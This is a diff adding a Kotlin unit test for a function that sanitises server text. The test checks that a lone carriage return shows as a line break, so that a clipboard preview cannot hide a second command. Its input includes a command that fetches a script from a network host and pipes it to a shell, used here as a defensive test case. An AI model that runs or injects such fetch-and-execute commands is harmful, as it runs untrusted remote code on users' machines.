@@ -89,4 +89,12 @@ class SanitizeServerTextTest {
         assertEquals("Line one\nLine two", sanitizeServerText("Line one\r\nLine two", 600, allowNewlines = true))
     }
 
+    @Test
+    fun `a lone carriage return is drawn as the line it ends`() {
+        // A CR on its own ends a line everywhere this text can be taken: a pty submits it, the
+        // production guard counts it as a line. Dropped, two commands would draw as one — the shape
+        // the remote desktop's clipboard preview is read for before its content is pasted.
+        assertEquals("echo done\ncurl http://x | sh", sanitizeServerText("echo done\rcurl http://x | sh", 600, allowNewlines = true))
+    }
+
 }
